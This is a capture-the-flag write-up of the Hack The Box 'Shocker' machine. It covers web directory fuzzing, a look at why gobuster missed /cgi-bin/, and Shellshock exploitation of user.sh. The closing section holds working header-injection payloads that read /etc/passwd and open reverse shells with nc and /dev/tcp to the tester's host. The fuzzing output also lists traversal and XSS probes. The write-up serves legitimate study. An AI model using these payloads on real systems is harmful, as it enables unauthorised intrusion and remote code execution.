# Website

The website is very simple, with just an image and a title:

![[Pasted image 20210614082656.png]]

There's nothing interesting in the source, either:

![[Pasted image 20210614082713.png]]

I also checked the Apache version number out in ExploitDB and Google, but it didn't find much besides a local priv esc and a couple of denial of service attacks.

## Enumerating Tech Stack

I did some poking around to see what technologies might be running on the server. Visiting `index.html` worked:

![[Pasted image 20210614085530.png]]

But `index.php` didn't:

![[Pasted image 20210614085505.png]]

This means gobuster rightly should have found stuff without any extra `-x` parameters, as there's nothing so far to suggest that the server is running PHP. `curl -v` tells us nothing new either:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/shocker]
└─$ curl -v http://10.10.10.56
*   Trying 10.10.10.56:80...
* Connected to 10.10.10.56 (10.10.10.56) port 80 (#0)
> GET / HTTP/1.1
> Host: 10.10.10.56
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Mon, 14 Jun 2021 08:01:26 GMT
< Server: Apache/2.4.18 (Ubuntu)
< Last-Modified: Fri, 22 Sep 2017 20:01:19 GMT
< ETag: "89-559ccac257884"
< Accept-Ranges: bytes
< Content-Length: 137
< Vary: Accept-Encoding
< Content-Type: text/html
< 
 <!DOCTYPE html>
<html>
<body>

<h2>Don't Bug Me!</h2>
<img src="bug.jpg" alt="bug" style="width:450px;height:350px;">

</body>
</html> 
* Connection #0 to host 10.10.10.56 left intact
```

## More Fuzzing

I had a look through the seclists folder to see if there were any other useful looking lists:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/shocker]
└─$ ls /usr/share/seclists/Discovery/Web-Content/
```

I checked the size of the apache-related ones:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/shocker]
└─$ wc -l /usr/share/seclists/Discovery/Web-Content/apache.txt 
32 /usr/share/seclists/Discovery/Web-Content/apache.txt
┌──(mac㉿kali)-[~/Documents/HTB/shocker/results/10.10.10.56/scans]
└─$ wc -l /usr/share/seclists/Discovery/Web-Content/Apache.fuzz.txt 
8531 /usr/share/seclists/Discovery/Web-Content/Apache.fuzz.txt
```

And scanned using the biggest list:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/shocker/results/10.10.10.56/scans]
└─$ gobuster dir -u http://10.10.10.56 -w /usr/share/seclists/Discovery/Web-Content/Apache.fuzz.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/Apache.fuzz.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/14 09:30:51 Starting gobuster in directory enumeration mode
===============================================================
//.htaccess           (Status: 403) [Size: 295]
//.htaccess.bak       (Status: 403) [Size: 299]
//.htpasswd           (Status: 403) [Size: 295]
//index.html          (Status: 200) [Size: 137]
//server-status       (Status: 403) [Size: 299]
                                               
===============================================================
2021/06/14 09:31:15 Finished
===============================================================
```

It found nothing.

## Shellshock

Due to the name of the box, I started googling for shellshock vulnerabilities, as I'd heard of the exploit but never used it. This felt a little bit disingenuous - I'm not sure if boxes are 'named' on the OSCP exam, so I was hoping to be able to find the exploit naturally with enumeration rather than via clues in the name and on forums.

Despite this, I hadn't gotten anywhere, and I didn't know *what* to look for with shellshock. I found an excellent OWASP Article that opened the door for some next steps: [https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf](https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf)

### Background

The exploit seems to be in a malicious functions definition in a bash environment variable:

![[Pasted image 20210614092556.png]]

Specifically, it mentions these attack vectors:

![[Pasted image 20210614092358.png]]

With this setup for attacking apache:

![[Pasted image 20210614092432.png]]

And this payload:

![[Pasted image 20210614092454.png]]

### Fuzzing for Shellshock

I checked for the script mentioned in the slides, but it wasn't on the server:

![[Pasted image 20210614093230.png]]

Is the directory present?

![[Pasted image 20210614093422.png]]

Yes! I can't list it, but I can now fuzz it.

#### Gobuster Debugging

Before I moved on, I thought it's quite irritating that this didn't show up on my `gobuster` scans. I decided to look into why it failed, but you can skip to the [[#Fuzzing for Vulnerable Binaries|next section]] if you're not interested.

I'm not sure what wordlist I should have used. I did a quick `grep` within the directory for `cgi-bin`:

This threw up a lot of results, as it also matched searches containing this phrase - I ran an exact match to filter some stuff out:

```bash
┌──(mac㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
└─$ grep -Ri "^cgi-bin$" .
./raft-large-words-lowercase.txt:cgi-bin
./directory-list-1.0.txt:cgi-bin
./Oracle EBS wordlist.txt:cgi-bin
./frontpage.txt:cgi-bin
./directory-list-2.3-medium.txt:cgi-bin
./directory-list-2.3-medium.txt:CGI-BIN
./directory-list-lowercase-2.3-small.txt:cgi-bin
./SVNDigger/all-dirs.txt:cgi-bin
./SVNDigger/all.txt:cgi-bin
./raft-small-words-lowercase.txt:cgi-bin
./common-and-portuguese.txt:cgi-bin
./raft-medium-words-lowercase.txt:cgi-bin
./raft-large-words.txt:cgi-bin
./raft-large-words.txt:CGI-BIN
./raft-large-words.txt:Cgi-bin
./raft-large-words.txt:CGI-Bin
./raft-large-words.txt:Cgi-Bin
./raft-large-words.txt:cgi-Bin
./raft-large-words.txt:CGI-bin
./big.txt:cgi-bin
./common-and-spanish.txt:cgi-bin
./common-and-french.txt:cgi-bin
./raft-medium-directories.txt:cgi-bin
./raft-medium-directories.txt:CGI-BIN
./raft-medium-directories.txt:Cgi-bin
./raft-medium-directories.txt:CGI-Bin
./raft-medium-directories.txt:Cgi-Bin
./raft-medium-directories.txt:cgi-Bin
./common.txt:cgi-bin
./raft-large-directories-lowercase.txt:cgi-bin
./directory-list-2.3-small.txt:cgi-bin
./directory-list-2.3-small.txt:CGI-BIN
./apache.txt:cgi-bin
./directory-list-2.3-big.txt:cgi-bin
./directory-list-2.3-big.txt:CGI-BIN
./directory-list-lowercase-2.3-big.txt:cgi-bin
./raft-medium-words.txt:cgi-bin
./raft-medium-words.txt:CGI-BIN
./raft-medium-words.txt:Cgi-bin
./raft-medium-words.txt:CGI-Bin
./raft-medium-words.txt:Cgi-Bin
./raft-medium-words.txt:cgi-Bin
./sunas.txt:cgi-bin
./raft-medium-directories-lowercase.txt:cgi-bin
./common-and-italian.txt:cgi-bin
./api/objects.txt:cgi-bin
./raft-small-directories.txt:cgi-bin
./raft-small-directories.txt:CGI-BIN
./raft-small-directories.txt:Cgi-bin
./oracle.txt:cgi-bin
./iplanet.txt:cgi-bin
./raft-small-words.txt:cgi-bin
./raft-small-words.txt:CGI-BIN
./raft-small-words.txt:Cgi-bin
./raft-small-words.txt:CGI-Bin
./raft-small-words.txt:Cgi-Bin
./raft-large-directories.txt:cgi-bin
./raft-large-directories.txt:CGI-BIN
./raft-large-directories.txt:Cgi-bin
./raft-large-directories.txt:CGI-Bin
./raft-large-directories.txt:Cgi-Bin
./raft-large-directories.txt:cgi-Bin
./raft-large-directories.txt:CGI-bin
./domino-endpoints-coldfusion39.txt:cgi-bin
./common-and-dutch.txt:cgi-bin
./directory-list-lowercase-2.3-medium.txt:cgi-bin
./raft-small-directories-lowercase.txt:cgi-bin
```

It looks like pretty much every wordlist checks for `cgi-bin` - *including* the one I used. So why didn't gobuster highlight it?

I tried a couple of other tools. `wfuzz` also failed to find it:

```bash
┌──(mac㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
└─$ wfuzz -u http://10.10.10.56/FUZZ -w raft-small-words.txt --hc 404
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.56/FUZZ
Total requests: 43003

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                 
=====================================================================

000000007:   403        11 L     32 W       291 Ch      ".html"                                                                                                                                 
000000038:   403        11 L     32 W       290 Ch      ".htm"                                                                                                                                  
000000400:   200        9 L      13 W       137 Ch      "."                                                                                                                                     
000000589:   403        11 L     32 W       295 Ch      ".htaccess"                                                                                                                             
000002138:   403        11 L     32 W       290 Ch      ".htc"                                                                                                                                  
000003475:   403        11 L     32 W       298 Ch      ".html_var_DE"                                                                                                                          
000004659:   403        11 L     32 W       299 Ch      "server-status"                                                                                                                         
000005736:   403        11 L     32 W       295 Ch      ".htpasswd"                                                                                                                             
000006495:   403        11 L     32 W       292 Ch      ".html."                                                                                                                                
000007255:   403        11 L     32 W       296 Ch      ".html.html"                                                                                                                            
000008280:   403        11 L     32 W       296 Ch      ".htpasswds"                                                                                                                            
000010844:   403        11 L     32 W       291 Ch      ".htm."                                                                                                                                 
000011528:   403        11 L     32 W       292 Ch      ".htmll"                                                                                                                                
000012350:   403        11 L     32 W       295 Ch      ".html.old"                                                                                                                             
000013429:   403        11 L     32 W       295 Ch      ".html.bak"                                                                                                                             
000013428:   403        11 L     32 W       289 Ch      ".ht"                                                                                                                                   
000014573:   403        11 L     32 W       294 Ch      ".htm.htm"                                                                                                                              
000017669:   403        11 L     32 W       290 Ch      ".hta"                                                                                                                                  
000017671:   403        11 L     32 W       292 Ch      ".html1"                                                                                                                                
000017670:   403        11 L     32 W       294 Ch      ".htgroup"                                                                                                                              
000019900:   403        11 L     32 W       301 Ch      ".html.printable"                                                                                                                       
000019899:   403        11 L     32 W       295 Ch      ".html.LCK"                                                                                                                             
000022817:   403        11 L     32 W       294 Ch      ".htm.LCK"                                                                                                                              
000027081:   403        11 L     32 W       299 Ch      ".htaccess.bak"                                                                                                                         
000027083:   403        11 L     32 W       292 Ch      ".htmls"                                                                                                                                
000027082:   403        11 L     32 W       295 Ch      ".html.php"                                                                                                                             
000027084:   403        11 L     32 W       290 Ch      ".htx"                                                                                                                                  
000033266:   403        11 L     32 W       291 Ch      ".htlm"                                                                                                                                 
000033268:   403        11 L     32 W       292 Ch      ".html-"                                                                                                                                
000033267:   403        11 L     32 W       291 Ch      ".htm2"                                                                                                                                 
000033269:   403        11 L     32 W       293 Ch      ".htuser"                                                                                                                               

Total time: 0
Processed Requests: 43003
Filtered Requests: 42972
Requests/sec.: 0
```

As did gobuster with the `raft-small-directories-lowercase.txt`, which contains multiple variations on `cgi-bin`:

```bash
┌──(mac㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
└─$ grep cgi-bin raft-small-directories-lowercase.txt 
cgi-bin
scgi-bin
fcgi-bin
cgi-bin2
_cgi-bin
private-cgi-bin
vcgi-bin
cgi-bin-church
cgi-bin-debug
cgi-bin-live
cgi-bin_ssl
pcgi-bin
```

I tried again with `wfuzz`, this time adding a `/`, and it found the directory almost immediately:

```bash
┌──(mac㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
└─$ wfuzz -u http://10.10.10.56/FUZZ/ -w raft-small-directories-lowercase.txt --hc 404
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.56/FUZZ/
Total requests: 17770

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                 
=====================================================================

000000001:   403        11 L     32 W       294 Ch      "cgi-bin"                                                                                                                               
000000370:   403        11 L     32 W       292 Ch      "icons"
```

This is extremely annoying, and actually a little worrying for the exam if common tools don't consistently pick up on directories like this.

After finishing the box, I looked at [Rana Khalil's writeup](https://ranakhalil101.medium.com/hack-the-box-shocker-writeup-w-o-metasploit-feb9e5fa5aa2) (as always) - she used the following gobuster command to enumerate directories:

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.56 -f
```

My command didn't find it as `/cgi-bin` returns a 404, whereas `/cgi-bin/` returns a 403. This is sort of uncommon behaviour - usually if a directory exists and is accessed without a `/`, the webserver should redirect with a 302. Gobuster usually picks up on this, but this webserver didn't redirect for whatever reason so it was missed.

```bash
┌──(mac㉿kali)-[~/Documents/HTB/shocker/www]
└─$ curl http://10.10.10.56/cgi-bin
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /cgi-bin was not found on this server.</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.56 Port 80</address>
</body></html>
┌──(mac㉿kali)-[~/Documents/HTB/shocker/www]
└─$ curl http://10.10.10.56/cgi-bin/
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access /cgi-bin/
on this server.<br />
</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.56 Port 80</address>
</body></html>
```

This is a good example of why to read writeups from other people as you prep - it's okay to take hints as well, especially if you use it to learn *how* they got to that point. I often peek at a hint, then try to figure out what I'd have to google to come up with that result.

#### Fuzzing for Vulnerable Binaries

Once again, I'll go over how I searched for the target binary - but you can skip to [[#Getting a Shell|exploiting it]] if you wish.

A couple of good things came out of my Gobuster woes - one was the valuable lesson to use a bigger wordlist or a different tool to fuzz if you're getting no results. The second was the discovery of a wordlist specifically for CGI files! I used this to fuzz for exploitable files on the server:

```bash
┌──(mac㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
└─$ gobuster dir -u http://10.10.10.56/cgi-bin/ -w CGIs.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56/cgi-bin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                CGIs.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/14 09:50:35 Starting gobuster in directory enumeration mode
===============================================================
/./                   (Status: 403) [Size: 294]
Progress: 82 / 3389 (2.42%)                   [ERROR] 2021/06/14 09:50:36 [!] parse "http://10.10.10.56/cgi-bin/%NETHOOD%/": invalid URL escape "%NE"
/?mod=node&nid=some_thing&op=view (Status: 403) [Size: 294]
/?mod=some_thing&op=browse (Status: 403) [Size: 294]       
//                    (Status: 403) [Size: 295]            
/?OpenServer          (Status: 403) [Size: 294]            
/?Open                (Status: 403) [Size: 294]            
[ERROR] 2021/06/14 09:50:37 [!] parse "http://10.10.10.56/cgi-bin/%a%s%p%d": invalid URL escape "%a%"
/%2e/                 (Status: 403) [Size: 294]            
[ERROR] 2021/06/14 09:50:37 [!] parse "http://10.10.10.56/cgi-bin/default.htm%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%": invalid URL escape "%"
/../../../../../../../../../boot.ini (Status: 400) [Size: 303]
/../../../../winnt/repair/sam._ (Status: 400) [Size: 303]     
/DomainFiles/*//../../../../../../../../../../etc/passwd (Status: 400) [Size: 303]
/cgi-bin/ssi//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd (Status: 400) [Size: 303]
/../../../../../../../../../../etc/passwd (Status: 400) [Size: 303]                                
/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini (Status: 400) [Size: 303]                      
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd (Status: 400) [Size: 303]             
/?mod=<script>alert(document.cookie)</script>&op=browse (Status: 403) [Size: 294]                  
/?sql_debug=1         (Status: 403) [Size: 294]                                                    
///                   (Status: 403) [Size: 296]                                                    
/file/../../../../../../../../etc/ (Status: 400) [Size: 303]                                       
/?PageServices        (Status: 403) [Size: 294]                                                    
/?wp-cs-dump          (Status: 403) [Size: 294]                                                    
/./../../../../../../../../../etc/passw* (Status: 400) [Size: 303]                                 
/./../../../../../../../../../etc/* (Status: 400) [Size: 303]                                      
/.htpasswd            (Status: 403) [Size: 303]                                                    
/.htaccess            (Status: 403) [Size: 303]                                                    
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// (Status: 403) [Size: 501]
Progress: 2961 / 3389 (87.37%)                                                                                                                                                                           /?pattern=/etc/*&sort=name (Status: 403) [Size: 294]                                                                                                                                                                                      
Progress: 3144 / 3389 (92.77%)                                                                                                                                                                           /?D=A                 (Status: 403) [Size: 294]                                                                                                                                                                                           
/?N=D                 (Status: 403) [Size: 294]                                                                                                                                                                                           
/?S=A                 (Status: 403) [Size: 294]                                                                                                                                                                                           
/?M=A                 (Status: 403) [Size: 294]                                                                                                                                                                                           
/cgi-bin/NUL/../../../../../../../../../WINNT/system32/ipconfig.exe (Status: 400) [Size: 303]                                                                                                                                             
/cgi-bin/../../../../../../../../../../WINNT/system32/ipconfig.exe (Status: 400) [Size: 303]                                                                                                                                              
/cgi-bin/PRN/../../../../../../../../../WINNT/system32/ipconfig.exe (Status: 400) [Size: 303]                                                                                                                                             
/?\"><script>alert('Vulnerable');</script> (Status: 403) [Size: 294]                                                                                                                                                                      
Progress: 3304 / 3389 (97.49%)                                                                                                                                                                                                                                                                                                                                                                                                                     
===============================================================
2021/06/14 09:50:46 Finished
===============================================================
```

No luck. I ran a scan again against the directory with `raft-small-words.txt`, specifying the `.cgi` extension:

```bash
┌──(mac㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
└─$ gobuster dir -u http://10.10.10.56/cgi-bin/ -w raft-small-words.txt -x cgi
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56/cgi-bin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              cgi
[+] Timeout:                 10s
===============================================================
2021/06/14 09:52:38 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 299]
/.html.cgi            (Status: 403) [Size: 303]
/.htm                 (Status: 403) [Size: 298]
/.htm.cgi             (Status: 403) [Size: 302]
/.                    (Status: 403) [Size: 294]
/.htaccess            (Status: 403) [Size: 303]
/.htaccess.cgi        (Status: 403) [Size: 307]
/.htc                 (Status: 403) [Size: 298]
/.htc.cgi             (Status: 403) [Size: 302]
/.html_var_DE         (Status: 403) [Size: 306]
/.html_var_DE.cgi     (Status: 403) [Size: 310]
/.htpasswd.cgi        (Status: 403) [Size: 307]
/.htpasswd            (Status: 403) [Size: 303]
/.html.               (Status: 403) [Size: 300]
/.html..cgi           (Status: 403) [Size: 304]
/.html.html           (Status: 403) [Size: 304]
/.html.html.cgi       (Status: 403) [Size: 308]
/.htpasswds           (Status: 403) [Size: 304]
/.htpasswds.cgi       (Status: 403) [Size: 308]
/.htm.                (Status: 403) [Size: 299]
/.htm..cgi            (Status: 403) [Size: 303]
/.htmll               (Status: 403) [Size: 300]
/.htmll.cgi           (Status: 403) [Size: 304]
/.html.old            (Status: 403) [Size: 303]
/.html.old.cgi        (Status: 403) [Size: 307]
/.ht                  (Status: 403) [Size: 297]
/.html.bak            (Status: 403) [Size: 303]
/.ht.cgi              (Status: 403) [Size: 301]
/.html.bak.cgi        (Status: 403) [Size: 307]
/.htm.htm             (Status: 403) [Size: 302]
/.htm.htm.cgi         (Status: 403) [Size: 306]
/.hta                 (Status: 403) [Size: 298]
/.htgroup             (Status: 403) [Size: 302]
/.html1               (Status: 403) [Size: 300]
/.htgroup.cgi         (Status: 403) [Size: 306]
/.hta.cgi             (Status: 403) [Size: 302]
/.html1.cgi           (Status: 403) [Size: 304]
/.html.LCK            (Status: 403) [Size: 303]
/.html.printable      (Status: 403) [Size: 309]
/.html.LCK.cgi        (Status: 403) [Size: 307]
/.html.printable.cgi  (Status: 403) [Size: 313]
/.htm.LCK             (Status: 403) [Size: 302]
/.htm.LCK.cgi         (Status: 403) [Size: 306]
/.htmls.cgi           (Status: 403) [Size: 304]
/.htmls               (Status: 403) [Size: 300]
/.htx                 (Status: 403) [Size: 298]
/.html.php            (Status: 403) [Size: 303]
/.htaccess.bak        (Status: 403) [Size: 307]
/.htaccess.bak.cgi    (Status: 403) [Size: 311]
/.htx.cgi             (Status: 403) [Size: 302]
/.html.php.cgi        (Status: 403) [Size: 307]
/.htlm.cgi            (Status: 403) [Size: 303]
/.htm2                (Status: 403) [Size: 299]
/.html-               (Status: 403) [Size: 300]
/.htuser              (Status: 403) [Size: 301]
/.htlm                (Status: 403) [Size: 299]
/.htm2.cgi            (Status: 403) [Size: 303]
/.html-.cgi           (Status: 403) [Size: 304]
/.htuser.cgi          (Status: 403) [Size: 305]
                                               
===============================================================
2021/06/14 09:56:51 Finished
===============================================================
```

Nothing again! What about a shells list?

```bash
┌──(mac㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
└─$ gobuster dir -u http://10.10.10.56/cgi-bin/ -w CommonBackdoors-PL.fuzz.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56/cgi-bin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                CommonBackdoors-PL.fuzz.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/14 10:05:26 Starting gobuster in directory enumeration mode
===============================================================

===============================================================
2021/06/14 10:05:27 Finished
===============================================================
```

I tried searching for alternative target files other people had found. I read a number of really excellent articles that I'll link at the end, but nothing that helped find the script until this one:

![[Pasted image 20210614100713.png]]

[The article](https://shahjerry33.medium.com/shellshock-high-voltage-a6bd2ce69659) describes an example with a `.sh` file:

![[Pasted image 20210614101325.png]]

So let's fuzz for that file extension:

```bash
──(mac㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
└─$ gobuster dir -u http://10.10.10.56/cgi-bin/ -w raft-small-words.txt -x sh
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56/cgi-bin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              sh
[+] Timeout:                 10s
===============================================================
2021/06/14 10:13:48 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 299]
/.html.sh             (Status: 403) [Size: 302]
/.htm                 (Status: 403) [Size: 298]
/user.sh              (Status: 200) [Size: 118]
...[snip]...
```

Gobuster immediately found `user.sh`. While the scan finishes, we can test it:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/shocker]
└─$ wget -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://10.10.10.56/cgi-bin/user.sh
--2021-06-14 10:15:38--  http://10.10.10.56/cgi-bin/user.sh
Connecting to 10.10.10.56:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/plain]
Saving to: ‘user.sh’

user.sh                                                [ <=>                                                                                                          ]   1.53K  --.-KB/s    in 0s      

2021-06-14 10:15:39 (131 MB/s) - ‘user.sh’ saved [1568]

┌──(mac㉿kali)-[~/Documents/HTB/shocker]
└─$ cat user.sh 

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
shelly:x:1000:1000:shelly,,,:/home/shelly:/bin/bash
```

It works! We've enumerated the users on the box, and can now attempt to get a shell. We're safe to cancel the rest of the gobuster scan, too (we've really hammered this box).

### Getting a Shell

I tried the command from the OWASP talk first:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/shocker]
└─$ curl -H "X-Frame-Options: () {:;};echo;/bin/nc -e /bin/bash 10.10.16.211 9001" http://10.10.10.56/cgi-bin/user.sh
Content-Type: text/plain

Just an uptime test script

 05:35:55 up  2:09,  0 users,  load average: 0.00, 0.00, 0.00
```

This didn't work - so I tried my usual bash reverse shell, instead using the User Agent header (as suggested in the [shahjerry post](https://shahjerry33.medium.com/shellshock-high-voltage-a6bd2ce69659)):

```bash
┌──(mac㉿kali)-[~/Documents/HTB/shocker]
└─$ curl -H "User-Agent: () { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.211/9001 0>&1'" http://10.10.10.56/cgi-bin/user.sh
```

The command hung, and in my netcat listener... I had a shell!

![[Pasted image 20210614103350.png]]